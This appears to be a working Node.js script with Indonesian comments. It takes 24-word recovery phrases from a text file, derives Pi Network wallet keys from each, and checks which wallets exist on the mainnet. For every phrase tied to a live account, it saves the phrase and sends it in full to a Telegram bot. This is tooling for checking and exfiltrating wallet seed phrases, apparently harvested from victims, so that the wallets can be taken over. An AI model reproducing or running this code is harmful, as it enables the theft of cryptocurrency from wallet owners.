const fs = require('fs');
const axios = require('axios');
const bip39 = require('bip39');
const edHd = require('ed25519-hd-key');

const StellarSdk = require('stellar-sdk');
// Ganti dengan info Telegram kamu
const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';

// StellarSdk.Server
// Ini adalah cara yang benar untuk versi 10.4.1
const server = new StellarSdk.Server('https://api.mainnet.minepi.com');

// Kirim pesan ke Telegram
async function kirimTelegram(pesan) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: pesan,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error('❌ Gagal kirim ke Telegram:', error.message);
  }
}

// Ubah mnemonic ke keypair Stellar (path Pi Network)
function mnemonicToStellarKeypair(mnemonic) {
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const { key } = edHd.derivePath("m/44'/314159'/0'", seed);
  //StellarSdk.Keypair
  return StellarSdk.Keypair.fromRawEd25519Seed(key);
}

// Ambil dan filter daftar mnemonic dari file
const mnemonics = fs.readFileSync('pharses.txt', 'utf8')
  .split('\n')
  .map(line => line.trim())
  .filter(line => line && line.split(' ').length === 24);

// Kosongkan file hasil sebelumnya
fs.writeFileSync('valid.txt', '');
fs.writeFileSync('invalid.txt', '');

// Cek setiap mnemonic
async function cekSemua() {
  for (const mnemonic of mnemonics) {
    try {
      const keypair = mnemonicToStellarKeypair(mnemonic);
      const pubkey = keypair.publicKey();

      // Coba load akun dari jaringan Pi
      await server.loadAccount(pubkey);

      // Jika berhasil (terdaftar)
      console.log(`✅ Terdaftar: ${pubkey}`);
      fs.appendFileSync('valid.txt', `${mnemonic}\n`);

      const pesan = `✅ *Mnemonic Valid & Terdaftar*\n\n\`${mnemonic}\`\n\n*Public Key:*\n\`${pubkey}\``;
      await kirimTelegram(pesan);
    } catch (err) {
      if (err.response && err.response.status === 404) {
        const keypair = mnemonicToStellarKeypair(mnemonic);
        const pubkey = keypair.publicKey();
        console.log(`❌ Tidak terdaftar: ${pubkey}`);
        fs.appendFileSync('invalid.txt', `${mnemonic}\n`);
      } else {
        console.error(`⚠️ Error saat cek mnemonic: ${mnemonic}`);
        console.error(err.message || err);
      }
    }
  }
}

cekSemua();
